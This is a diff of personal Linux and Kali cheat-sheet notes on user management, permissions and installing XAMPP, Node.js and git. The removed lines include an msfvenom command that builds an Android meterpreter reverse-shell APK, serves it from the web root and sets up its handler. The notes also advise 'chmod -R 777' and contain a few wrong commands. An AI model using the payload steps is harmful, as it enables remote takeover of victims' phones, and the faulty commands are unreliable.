@@ -1,56 +1,43 @@
-1. give folder to specific user..  chown rapidexworldwide:rapidexworldwide international-courier-service
+1.  httrack https://bootstrapdemos.wrappixel.com/ample/dist/main/ -O cloned_website --robots=0 "+*.html" "+*.css" "+*.js" "+*.jpg" "+*.jpeg" "+*.png" "+*.gif" "+*.svg" "+*.ico" "+*.woff*" "+*.ttf" "+*.otf" "+*.eot"
 
 
+=> Role Management
+	1. Run sudo user as root user : sudo -i
+		 back to current sudo user : logout from root user
+	2. user
+		i. create user : useradd username 
+		ii. create sudo user : useradd rekha && useradd -aG sudo rekha
+		iii.delete user : userdel rekha
+			- along directory : userdel -r rekha
+		iv. change password : passwd rekha	
+		v. change password for own : passwd
+		v. transfer ownership folder to user :  chown username:group folderName
+	3. group
+		i. create group : groupadd website
+		ii. add user to group : usermod -aG website rekha1, rekha2, rekha3
 
-
-
-
-
-
-
-
-
-=> minimize/close option not showing in kali linux just run this command : xfwm4
-=> desktop not showing : xfdesktop
-
-=> msfvon
-worked msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.213.83 R> /var/www/html/android.apk
-set lhost  192.168.213.83
-
-set payload android/meterpreter/reverse_tcp
-use exploit/multi/handler
-msfconsole
-everything is done..
-
-1. Basic Linux Commands : 
-    => Move file with permission root
-        sudo mv file/foldernName localtionofMoveFile/opt/lampp/htdocs
-        
-     => sudo chmod -R 777 filedirectory/file.php // -R : may be used for subfolder and file permissioin 
-     	7 is for all permissions read, write and execute.
-	6 is used for read and write.
-	5 is used for read and execute.
-	4 is used for read only.
-               
-
-    => Before Run Any command must be use "sudo" thats mean user give an permission for install something in linux operating system
-             download xampp server for linux 
-             sudo ./xampp-linux-x64-8.1.2-0-installer.run
-    => Kazam Screen recorder for kali 
+	4. Disable Root Login
+		i. nano /etc/ssh/sshd_config
+		ii. change permitRootLogin = yes to permitRootLogin = no
+	
+=>Basic Linux Commands : 
+       1. Move File : sudo mv file/foldernName localtionofMoveFile/opt/lampp/htdocs 
+       2.  sudo chmod -R 777 filedirectory/file.php // -R : may be used for subfolder and file permissioin 
+	     	7 is for all permissions read, write and execute.
+		6 is used for read and write.
+		5 is used for read and execute.
+		4 is used for read only
+		
+    
+1.1. Software Installation in Linux 
+    1. Xampp Installtion : sudo dpkg -i xampp-linux-x64-8.1.2-0-installer.run
+    2. visual studio :  sudo dpkg -i visual.deb.
+    3. Kazam Screen recorder for kali . 
         Super+Ctrl+R: Start recording
         Super+Ctrl+P: Pause recording, press again for resuming the recording
         Super+Ctrl+F: Finish recording
         Super+Ctrl+Q: Quit recording
-    
-1.1. install software in linux 
-    =>  sudo dpkg -i xampp-linux-x64-8.1.2-0-installer.run
-    =>  sudo dpkg -i visual.deb.
-    1.1.1 Installation of  tar.gz file 
-    	
-    
-
-2. NODE JS INSTALLATINO INSTRUCTION
-    2.1 install node js via tar.xz file
+    3. NODE-JS via tar.xz file
         => sudo apt update
         => sudo apt install xz-utils // its allow for install .xz file
         => Extract file from tar.xz 
@@ -60,14 +47,13 @@ everything is done..
             sudo cp -r heroku/{bin,lib,node_modules} /usr/
         =>  check installed or not : node - v and npm -v
 
-    2.1.1 npm ERR!can not add insert something : 
-        => dpkg -i --force-overwrite nodejs_17.6.0-deb-1nodesource1_amd64.deb
-
-        2.2 Remove Node js  from kali linux   
+    3.1.1 npm ERR!can not add insert something : 
+         => dpkg -i --force-overwrite nodejs_17.6.0-deb-1nodesource1_amd64.deb
+         => Remove Node js  from kali linux   
             “remove nodejs in kali linux completely” nod
             sudo rm -rf /usr/local/lib/node* && sudo rm -rf /usr/local/include/node* && sudo rm -rf /usr/local/bin/node*
         
-        2.2 Install stable version of node js
+        =>  Install stable version of node js
             sudo npm install -g n
             sudo n stable // node js will install stable version , you can check also stable version in node js website
             
@@ -76,49 +62,42 @@ everything is done..
             re-back command : rehash   (for csh and tcsh)
 
 
-3. install xamp server"
-    => download xampp server for linux 
-    => sudo ./xampp-linux-x64-8.1.2-0-installer.run
-    =>  Start xamp after installed : sudo /opt/lampp/lampp start XAMPP            
-    3.1 Open Pannel Xampp Server Icon
-        sudo /opt/lampp/manager-linux-x64.run
-         
-    3.2 xampp server help  run command:
-         sudo /opt/lampp/lampp yourActionBelow 
+     4. install xamp server"
+	    => download xampp server for linux 
+	    => sudo ./xampp-linux-x64-8.1.2-0-installer.run
+	    =>  Start xamp after installed : sudo /opt/lampp/lampp start XAMPP            
+	    4.1 Open Pannel Xampp Server Icon
+		sudo /opt/lampp/manager-linux-x64.run 
+	    4.2 xampp server help  run command:
+		 sudo /opt/lampp/lampp yourActionBelow 
 
-            start         Start XAMPP (Apache, MySQL and eventually others)
-            startapache   Start only Apache
-            startmysql    Start only MySQL
-            startftp      Start only ProFTPD
+		    start         Start XAMPP (Apache, MySQL and eventually others)
+		    startapache   Start only Apache
+		    startmysql    Start only MySQL
+		    startftp      Start only ProFTPD
 
-            stop          Stop XAMPP (Apache, MySQL and eventually others)
-            stopapache    Stop only Apache
-            stopmysql     Stop only MySQL
-            stopftp       Stop only PeiroFTPD
+		    stop          Stop XAMPP (Apache, MySQL and eventually others)
+		    stopapache    Stop only Apache
+		    stopmysql     Stop only MySQL
+		    stopftp       Stop only PeiroFTPD
 
-            reload        Reload XAMPP (Apache, MySQL and eventually others)
-            reloadapache  Reload only Apache
-            reloadmysql   Reload only MySQL
-            reloadftp     Reload only ProFTPD
+		    reload        Reload XAMPP (Apache, MySQL and eventually others)
+		    reloadapache  Reload only Apache
+		    reloadmysql   Reload only MySQL
+		    reloadftp     Reload only ProFTPD
 
-            restart       Stop and start XAMPP
-            security      Check XAMPP's security
+		    restart       Stop and start XAMPP
+		    security      Check XAMPP's security
+		    
+		    enablessl     Enable SSL support for Apache
+		    disablessl    Disable SSL support for Apache
 
-            enablessl     Enable SSL support for Apache
-            disablessl    Disable SSL support for Apache
+		    backup        Make backup file of your XAMPP config, log and data fies
 
-            backup        Make backup file of your XAMPP config, log and data fies
+		    oci8          Enable the oci8 extenssion
 
-            oci8          Enable the oci8 extenssion
+		    panel         Starts graphical XAMPP control panel
 
-            panel         Starts graphical XAMPP control panel
-
-4. install angular
-    => sudo npm install -g @angular/cli
-
-5. install git
-    => sudo apt-get install git
-    => Verfiy : git --version
+	5. install angular:sudo npm install -g @angular/cli
+	6. install git :  sudo apt-get install git
     
-6. install anaconda for python 
-	command : sudo bash filename.sh
